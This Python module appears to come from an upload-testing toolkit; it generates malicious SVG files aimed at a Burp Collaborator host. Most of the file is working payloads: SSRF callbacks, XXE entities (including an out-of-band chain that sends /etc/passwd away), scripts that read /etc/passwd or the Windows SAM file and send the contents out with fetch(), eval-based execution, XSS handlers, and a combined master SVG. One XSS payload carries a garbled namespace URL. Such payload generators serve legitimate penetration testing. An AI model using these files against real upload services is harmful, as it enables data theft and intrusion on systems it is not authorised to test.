from pathlib import Path

try:
    from .ssti_filename_generator import generate_ssti_filename_payloads
    from .xss_filename_generator import generate_xss_filename_payloads
except ImportError:
    try:
        from ssti_filename_generator import generate_ssti_filename_payloads
        from xss_filename_generator import generate_xss_filename_payloads
    except ImportError:
        generate_ssti_filename_payloads = None
        generate_xss_filename_payloads = None

def generate_svg_payloads(output_dir, burp_collab, tech_filter='all', payload_types=None):
    if payload_types is None:
        payload_types = {'all'}
    
    def should_generate_type(payload_type):
        return 'all' in payload_types or payload_type in payload_types
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    if should_generate_type('ssrf'):
        ssrf_dir = output_dir / 'ssrf'
        ssrf_dir.mkdir(exist_ok=True)
    if should_generate_type('lfi'):
        lfi_dir = output_dir / 'lfi'
        lfi_dir.mkdir(exist_ok=True)
    if should_generate_type('xxe'):
        xxe_dir = output_dir / 'xxe'
        xxe_dir.mkdir(exist_ok=True)
    if should_generate_type('rce') or should_generate_type('deserialization'):
        rce_dir = output_dir / 'rce'
        rce_dir.mkdir(exist_ok=True)
    if should_generate_type('xss'):
        xss_dir = output_dir / 'xss'
        xss_dir.mkdir(exist_ok=True)
    
    svg_ssrf1_image = f'''<svg width="200" height="200"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="{base_url}/img1" height="200" width="200"/>
</svg>'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf1_image.svg", 'w', encoding='utf-8') as f:
            f.write(svg_ssrf1_image)
    
    svg_ssrf2_use = f'''<svg width="200" height="200"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <use xlink:href="{base_url}/use1#foo"/>
</svg>'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf2_use.svg", 'w', encoding='utf-8') as f:
            f.write(svg_ssrf2_use)
    
    svg_ssrf3_css_link = f'''<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
	<link xmlns="http://www.w3.org/1999/xhtml" rel="stylesheet" href="{base_url}/css-link" type="text/css"/>
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
</svg>'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf3_css_link.svg", 'w', encoding='utf-8') as f:
            f.write(svg_ssrf3_css_link)
    
    svg_ssrf4_css_import = f'''<svg xmlns="http://www.w3.org/2000/svg">
  <style>
    @import url({base_url}/css-import);
  </style>
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
</svg>'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf4_css_import.svg", 'w', encoding='utf-8') as f:
            f.write(svg_ssrf4_css_import)
    
    svg_ssrf5_xml_stylesheet = f'''<?xml-stylesheet href="{base_url}/xml-stylesheet"?>
<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
</svg>'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf5_xml_stylesheet.svg", 'w', encoding='utf-8') as f:
            f.write(svg_ssrf5_xml_stylesheet)
    
    svg_ssrf6_xslt = f'''<?xml version="1.0" ?>
<?xml-stylesheet href="{base_url}/xslt" type="text/xsl" ?>
<svg width="10cm" height="5cm"
     xmlns="http://www.w3.org/2000/svg">
  <rect x="2cm" y="1cm" width="6cm" height="3cm"/>
</svg>'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf6_xslt.svg", 'w', encoding='utf-8') as f:
            f.write(svg_ssrf6_xslt)
    
    svg_ssrf7_script_external = f'''<svg width="100%" height="100%" viewBox="0 0 100 100"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
  <script src="{base_url}/script-external" type="text/javascript"/>
</svg>'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf7_script_external.svg", 'w', encoding='utf-8') as f:
            f.write(svg_ssrf7_script_external)
    
    svg_ssrf8_foreignobject_iframe = f'''<svg width="500" height="500"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>

  <foreignObject width="500" height="500">
    <iframe xmlns="http://www.w3.org/1999/xhtml" src="{base_url}/foreignobject-iframe"/>
  </foreignObject>
</svg>'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf8_foreignobject_iframe.svg", 'w', encoding='utf-8') as f:
            f.write(svg_ssrf8_foreignobject_iframe)
    
    if should_generate_type('lfi'):
        svg_lfi1_image = f'''<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<image href="file:///etc/passwd" width="100" height="100"/>
</svg>'''
        with open(lfi_dir / "lfi1_image_file.svg", 'w', encoding='utf-8') as f:
            f.write(svg_lfi1_image)
        
        svg_lfi2_script_file = f'''<svg xmlns="http://www.w3.org/2000/svg">
<script>
fetch('file:///etc/passwd').then(r => r.text()).then(t => fetch('{base_url}/lfi-svg-file1?data=' + encodeURIComponent(t)));
</script>
</svg>'''
        with open(lfi_dir / "lfi2_script_file.svg", 'w', encoding='utf-8') as f:
            f.write(svg_lfi2_script_file)
        
        svg_lfi3_windows = f'''<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<image href="file:///C:/Windows/System32/config/sam" width="100" height="100"/>
</svg>'''
        with open(lfi_dir / "lfi3_windows.svg", 'w', encoding='utf-8') as f:
            f.write(svg_lfi3_windows)
        
        svg_lfi4_php_wrapper = f'''<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<image href="php://filter/read=string.rot13/resource=file:///etc/passwd" width="100" height="100"/>
</svg>'''
        with open(lfi_dir / "lfi4_php_wrapper.svg", 'w', encoding='utf-8') as f:
            f.write(svg_lfi4_php_wrapper)
        
        svg_lfi5_script_exfil = f'''<svg xmlns="http://www.w3.org/2000/svg">
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'file:///etc/passwd', true);
xhr.onreadystatechange = function() {{
    if (xhr.readyState === 4) {{
        fetch('{base_url}/lfi-svg-exfil1?data=' + encodeURIComponent(xhr.responseText));
    }}
}};
xhr.send();
</script>
</svg>'''
        with open(lfi_dir / "lfi5_script_exfil.svg", 'w', encoding='utf-8') as f:
            f.write(svg_lfi5_script_exfil)
    
    if should_generate_type('xxe'):
        svg_xxe1_doctype = f'''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
  <!ENTITY xxe SYSTEM "{base_url}/xxe-svg">
]>
<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
  <text x="20" y="35">My &xxe;</text>
</svg>'''
        with open(xxe_dir / "xxe1_doctype.svg", 'w', encoding='utf-8') as f:
            f.write(svg_xxe1_doctype)
        
        svg_xxe2_file_entity = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="30">&xxe;</text>
</svg>'''
        with open(xxe_dir / "xxe2_file_entity.svg", 'w', encoding='utf-8') as f:
            f.write(svg_xxe2_file_entity)
        
        svg_xxe3_parameter_entity = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % xxe SYSTEM "{base_url}/xxe-svg-param">
  %xxe;
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>Test</text>
</svg>'''
        with open(xxe_dir / "xxe3_parameter_entity.svg", 'w', encoding='utf-8') as f:
            f.write(svg_xxe3_parameter_entity)
        
        svg_xxe4_nested_entity = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % remote SYSTEM "{base_url}/xxe-svg-nested">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{base_url}/xxe-svg-exfil?data=%file;'>">
  %remote;
  %eval;
  %exfil;
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>Test</text>
</svg>'''
        with open(xxe_dir / "xxe4_nested_entity.svg", 'w', encoding='utf-8') as f:
            f.write(svg_xxe4_nested_entity)
        
        svg_xxe5_windows_file = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/config/sam">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="30">&xxe;</text>
</svg>'''
        with open(xxe_dir / "xxe5_windows_file.svg", 'w', encoding='utf-8') as f:
            f.write(svg_xxe5_windows_file)
        
        svg_xxe6_php_filter = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="30">&xxe;</text>
</svg>'''
        with open(xxe_dir / "xxe6_php_filter.svg", 'w', encoding='utf-8') as f:
            f.write(svg_xxe6_php_filter)
    
    svg_xss1_script = f'''<svg xmlns="http://www.w3.org/2000/svg"><script>alert('XSS')</script></svg>'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss1_script.svg", 'w', encoding='utf-8') as f:
            f.write(svg_xss1_script)
    
    svg_xss2_onload = f'''<svg xmlns="http://www.w3.org/2000/svg" onload=alert('XSS')></svg>'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss2_onload.svg", 'w', encoding='utf-8') as f:
            f.write(svg_xss2_onload)
    
    svg_xss3_animate = f'''<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin=alert('XSS') attributeName=x dur=1s></animate></svg>'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss3_animate.svg", 'w', encoding='utf-8') as f:
            f.write(svg_xss3_animate)
    
    svg_xss4_image_error = f'''<svg xmlns="http://www.w3.org/2000/svg"><image href=x onerror=alert('XSS')></image></svg>'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss4_image_error.svg", 'w', encoding='utf-8') as f:
            f.write(svg_xss4_image_error)
    
    svg_xss5_foreignobject = f'''<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="400" height="400"><body xmlns="https://lnkd.in/dnneR-sD"><script>alert('XSS')</script></body></foreignObject></svg>'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss5_foreignobject.svg", 'w', encoding='utf-8') as f:
            f.write(svg_xss5_foreignobject)
    
    svg_xss6_script_external = f'''<svg width="100%" height="100%" viewBox="0 0 100 100"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
  <script src="javascript:alert(1)" type="text/javascript"/>
</svg>'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss6_script_external.svg", 'w', encoding='utf-8') as f:
            f.write(svg_xss6_script_external)
    
    svg_xss7_image_onload = f'''<svg width="100%" height="100%" viewBox="0 0 100 100"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
  <image xlink:href="{base_url}/foo.jpg" height="200" width="200" onload="document.getElementById('foo').setAttribute('fill', 'blue');alert(1);"/>
</svg>'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss7_image_onload.svg", 'w', encoding='utf-8') as f:
            f.write(svg_xss7_image_onload)
    
    if should_generate_type('rce') or should_generate_type('deserialization'):
        svg_rce1_file_script = f'''<svg xmlns="http://www.w3.org/2000/svg">
<script>
fetch('file:///etc/passwd').then(r => r.text()).then(data => {{
    eval('fetch("' + '{base_url}/rce-svg-file1?data=" + encodeURIComponent(data))');
}});
</script>
</svg>'''
        with open(rce_dir / "rce1_file_script.svg", 'w', encoding='utf-8') as f:
            f.write(svg_rce1_file_script)
        
        svg_rce2_file_exec = f'''<svg xmlns="http://www.w3.org/2000/svg">
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'file:///etc/passwd', false);
xhr.send();
var script = document.createElement('script');
script.textContent = xhr.responseText + ';fetch("{base_url}/rce-svg-exec1?executed=true");';
document.body.appendChild(script);
</script>
</svg>'''
        with open(rce_dir / "rce2_file_exec.svg", 'w', encoding='utf-8') as f:
            f.write(svg_rce2_file_exec)
        
        svg_rce3_file_import = f'''<svg xmlns="http://www.w3.org/2000/svg">
<script type="module">
var files = [
    'file:///etc/passwd',
    'file:///etc/hosts',
    'file:///proc/version',
    'file:///etc/issue',
    'file:///etc/os-release'
];
var currentIndex = 0;
function tryImport() {{
    if (currentIndex >= files.length) {{
        fetch('{base_url}/rce-svg-import1?all_failed=true');
        return;
    }}
    import(files[currentIndex]).then(module => {{
        fetch('{base_url}/rce-svg-import1?loaded=' + encodeURIComponent(files[currentIndex]));
    }}).catch(() => {{
        currentIndex++;
        tryImport();
    }});
}}
tryImport();
</script>
</svg>'''
        with open(rce_dir / "rce3_file_import.svg", 'w', encoding='utf-8') as f:
            f.write(svg_rce3_file_import)
        
        svg_rce4_xxe_script = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
<script>
var data = "&xxe;";
eval('fetch("' + '{base_url}/rce-svg-xxe1?data=" + encodeURIComponent(data))');
</script>
</svg>'''
        with open(rce_dir / "rce4_xxe_script.svg", 'w', encoding='utf-8') as f:
            f.write(svg_rce4_xxe_script)
        
        svg_rce5_file_worker = f'''<svg xmlns="http://www.w3.org/2000/svg">
<script>
var worker = new Worker('file:///tmp/worker.js');
worker.onmessage = function(e) {{
    fetch('{base_url}/rce-svg-worker1?data=' + encodeURIComponent(e.data));
}};
worker.postMessage('start');
</script>
</svg>'''
        with open(rce_dir / "rce5_file_worker.svg", 'w', encoding='utf-8') as f:
            f.write(svg_rce5_file_worker)
        
        svg_rce6_file_blob = f'''<svg xmlns="http://www.w3.org/2000/svg">
<script>
fetch('file:///etc/passwd').then(r => r.blob()).then(blob => {{
    var reader = new FileReader();
    reader.onload = function() {{
        eval(reader.result);
        fetch('{base_url}/rce-svg-blob1?executed=true');
    }};
    reader.readAsText(blob);
}});
</script>
</svg>'''
        with open(rce_dir / "rce6_file_blob.svg", 'w', encoding='utf-8') as f:
            f.write(svg_rce6_file_blob)
        
        svg_rce7_file_function = f'''<svg xmlns="http://www.w3.org/2000/svg">
<script>
Function('fetch("file:///etc/passwd").then(r => r.text()).then(data => eval(data + ";fetch(\\\"{base_url}/rce-svg-func1?executed=true\\\")"))')();
</script>
</svg>'''
        with open(rce_dir / "rce7_file_function.svg", 'w', encoding='utf-8') as f:
            f.write(svg_rce7_file_function)
    
    svg_master = f'''<?xml version="1.0" encoding="ISO-8859-1"?>
<?xml-stylesheet href="{base_url}/xml-stylesheet"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
  <!ENTITY xxe SYSTEM "{base_url}/xxe-svg">
]>
<svg onload="alert(1)" width="500" height="500" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <link xmlns="http://www.w3.org/1999/xhtml" rel="stylesheet" href="{base_url}/css-link" type="text/css"/>
  <style>
    @import url({base_url}/css-import);
  </style>
  <circle cx="50" cy="50" r="45" fill="green" id="foo"/>
  <image xlink:href="{base_url}/img1" height="200" width="200" onload="document.getElementById('foo').setAttribute('fill', 'blue');"/>
  <use xlink:href="{base_url}/use1#foo"/>
  <text x="20" y="35">My &xxe;</text>
  <script type="text/javascript">
    // <![CDATA[
      document.getElementById("foo").setAttribute("fill", "red");
      alert(1);
   // ]]>
  </script>
  <script src="{base_url}/script-external" type="text/javascript"/>
  <foreignObject width="500" height="500">
    <iframe xmlns="http://www.w3.org/1999/xhtml" src="{base_url}/foreignobject-iframe"/>
  </foreignObject>
</svg>'''
    with open(output_dir / "master.svg", 'w', encoding='utf-8') as f:
        f.write(svg_master)
    
    if generate_ssti_filename_payloads and should_generate_type('ssti'):
        generate_ssti_filename_payloads(output_dir, 'svg', burp_collab, tech_filter)
    
    if generate_xss_filename_payloads and should_generate_type('xss'):
        generate_xss_filename_payloads(output_dir, 'svg', burp_collab, tech_filter)
